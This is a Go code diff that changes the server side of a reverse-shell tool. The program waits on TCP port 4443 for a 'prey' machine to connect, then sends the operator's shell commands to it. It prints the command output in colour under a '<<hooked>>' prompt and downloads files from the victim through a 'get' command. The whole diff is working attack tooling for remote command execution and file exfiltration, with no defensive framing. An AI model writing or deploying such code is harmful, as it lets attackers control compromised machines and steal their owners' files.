@@ -4,37 +4,56 @@ import (
 	"bufio"
 	"fmt"
 	"io"
-	"log"
 	"net"
 	"os"
 	"strconv"
 	"strings"
+
+	"github.com/fatih/color"
 )
 
 // FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
-const FILEREADBUFFSIZE = 1024
+const FILEREADBUFFSIZE = 512
+
+//PORT set server port here
+const PORT = ":4443"
 
 func main() {
-	var buff [2048]byte //stores output from reverse shell
+	redc := color.New(color.FgHiRed, color.Bold)
+	greenc := color.New(color.FgHiGreen, color.Bold)
+	cyanc := color.New(color.FgCyan, color.Bold)
 
-	fmt.Println("Server started")
-	listner, _ := net.Listen("tcp", ":4455")
+	var recvdcmd [512]byte //stores output from reverse shell
+
+	cyanc.Println("Wait for Prey ...ZZZzzz")
+	listner, _ := net.Listen("tcp", PORT)
 	conn, _ := listner.Accept()
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		fmt.Print(">>")
+		redc.Print("<<hooked>>")
 		command, _ := reader.ReadString('\n')
-		if strings.Compare(command, "kill") == 0 {
+		if strings.Compare(command, "bye") == 0 {
 			conn.Write([]byte(command))
 			conn.Close()
-			os.Exit(1)
+			os.Exit(0)
 		} else if strings.Index(command, "get") == 0 {
 			getFilewithNameandSize(conn, command)
 
 		} else {
 			conn.Write([]byte(command))
-			n, _ := conn.Read(buff[0:])
-			fmt.Println(string(buff[0:n]))
+			for {
+				chunkbytes, _ := conn.Read(recvdcmd[0:])
+				//fmt.Println(string(recvdcmd[0:n]))
+				//if string(recvdcmd[0:n]) == "END"
+				if chunkbytes < 512 {
+					//finaloutput = string(recvdcmd[0:chunkbytes]) + finaloutput
+					greenc.Println(string(recvdcmd[0:chunkbytes]))
+					break
+				} else {
+					greenc.Println(string(recvdcmd[0:chunkbytes]))
+
+				}
+			}
 		}
 
 	}
@@ -51,17 +70,17 @@ func getFilewithNameandSize(connection net.Conn, command string) {
 	connection.Read(bufferFileSize)
 
 	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
-	fmt.Println("file size ", fileSize)
+	fmt.Println("File Size : ", fileSize)
 
 	connection.Read(bufferFileName)
 	fileName := strings.Trim(string(bufferFileName), ":")
 
-	fmt.Println("file name ", fileName)
+	fmt.Println("File Name : ", fileName)
 
 	newFile, err := os.Create(fileName)
 
 	if err != nil {
-		panic(err)
+		fmt.Println(err)
 	}
 	defer newFile.Close()
 	var receivedBytes int64
@@ -75,13 +94,6 @@ func getFilewithNameandSize(connection net.Conn, command string) {
 		io.CopyN(newFile, connection, FILEREADBUFFSIZE)
 		receivedBytes += FILEREADBUFFSIZE
 	}
-	fmt.Println("Received file completely!")
+	fmt.Println("File Download Completed ! ")
 	return
-}
-
-func checkerror(err error) {
-	if err != nil {
-		log.Fatal(err)
-	}
-
 }
